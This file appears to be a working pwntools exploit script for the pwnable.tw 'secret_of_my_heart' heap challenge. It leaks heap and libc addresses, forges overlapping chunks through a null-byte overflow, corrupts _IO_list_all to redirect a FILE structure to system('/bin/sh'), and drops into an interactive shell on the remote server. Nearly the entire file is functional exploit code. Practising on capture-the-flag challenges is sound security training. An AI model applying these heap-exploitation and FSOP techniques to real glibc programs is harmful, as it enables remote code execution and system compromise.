#
#	***************************
#	* Pwning exploit template *
#	* Arthor: Cobra           *
#	***************************
#

from pwn import *
import sys
import ctypes
import time

local = 0
debug = 0

def conn():
	global local
	global debug

	for arg in sys.argv[1:]:
		if arg in ('-h', '--help'):
			print('Usage: python ' + sys.argv[0] + ' <option> ...')
			print('Option:')
			print('        -h, --help:     Show help')
			print('        -l, --local:    Running on local')
			print('        -d, --debug:    Use gdb auto attach')
			exit(0)
		if arg in ('-l', '--local'):
			local = 1
		if arg in ('-d', '--debug'):
			debug = 1

	if local:
		s = process('./secret_of_my_heart_patched')
		if debug:
			gdb.attach(s, gdbscript='''
				brva 0x11A2
				b*_IO_flush_all_lockp
				b*__libc_system
				c
			''')
		else:
			#raw_input('DEBUG')
			pass
	else:
		s = remote('chall.pwnable.tw', 10302)

	return s

def test():
	s.sendlineafter(b'Your choice :', b'4869')
	s.recvuntil(b'Your secret : ')
	leak = int(s.recvline()[:-1].decode(), 16)
	log.info('Secret from server: 0x%x', leak)
	exit(0)

def add(size, name, data):
	s.sendlineafter(b'Your choice :', b'1')
	s.sendlineafter(b'Size of heart : ', str(size).encode())
	s.sendafter(b'Name of heart :', name)
	s.sendafter(b'secret of my heart :', data)

def show(index):
	s.sendlineafter(b'Your choice :', b'2')
	s.sendlineafter(b'Index :', str(index).encode())
	
def delete(index):
	s.sendlineafter(b'Your choice :', b'3')
	s.sendlineafter(b'Index :', str(index).encode())
	
elf = ELF('secret_of_my_heart')
libc = ELF('libc_64.so.6')
LIBC = ctypes.CDLL('./libc_64.so.6')

while True:
	try:
		s = conn()
		if not local:
			time.sleep(0.5)
		LIBC.srand(LIBC.time(0))
		addr = 0
		while addr <= 0x10000:
			addr = LIBC.rand() & 0xfffff000

		log.info('Secret: 0x%x', addr)
		#test()

		add(0x90, b'A' * 0x20, b'A\n')
		show(0)
		s.recvuntil(b'Name : ' + b'A' * 0x20)
		heap_base = int.from_bytes(s.recvline()[:-1], byteorder = 'little', signed = False) - 0x10
		log.info('Heap base: 0x%x', heap_base)

		add(0xf0, b'A\n', b'A\n')
		add(0x90, b'A\n', b'A\n')
		delete(0)
		add(0x98, b'A' * 16 + p64(heap_base), p64(addr) + p64(addr + 0x8) + p64(0) * 16 + p64(0xa0))
		delete(1)
		show(0)
		s.recvuntil(b'Secret : ')
		libc.address = int.from_bytes(s.recv(6), byteorder = 'little', signed = False) - 0x3c3b78
		log.info('Libc base: 0x%x', libc.address)
		delete(2)

		add(0x90, b'A' * 0x20, p64(0) + p64(0x231) + p64(addr + 0x10) + p64(addr + 0x18))
		add(0x78, b'A\n', b'A\n')
		add(0x78, b'A\n', b'A\n')
		add(0x98, b'A\n', b'A\n')
		add(0xf0, b'A\n', b'A\n')
		add(0x10, b'A\n', b'A\n')	

		delete(4)
		add(0x98, b'A\n', b'A' * 0x90 + p64(0x230))
		delete(5)
		add(0x90, b'A\n', b'A\n')

		payload = p64(0) * 11
		payload += p64(heap_base + 0x180)
		payload += p64(0) + p64(libc.symbols['system'])

		delete(3)
		add(0x78, b'A\n', payload)

		payload = b'/bin/sh\x00' + p64(0x61)
		payload += p64(0) + p64(libc.symbols['_IO_list_all'] - 0x10)
		payload += p64(2) + p64(3)
		payload += p64(0) * 9

		delete(2)
		add(0x78, b'A\n', payload)

		s.sendlineafter(b'Your choice :', b'1')
		s.sendlineafter(b'Size of heart : ', b'1')
		s.sendlineafter(b'Name of heart :', b'A')

		s.clean()
		s.sendline(b'ls')
		s.recv()

		break
	except:
		s.close()

s.interactive()
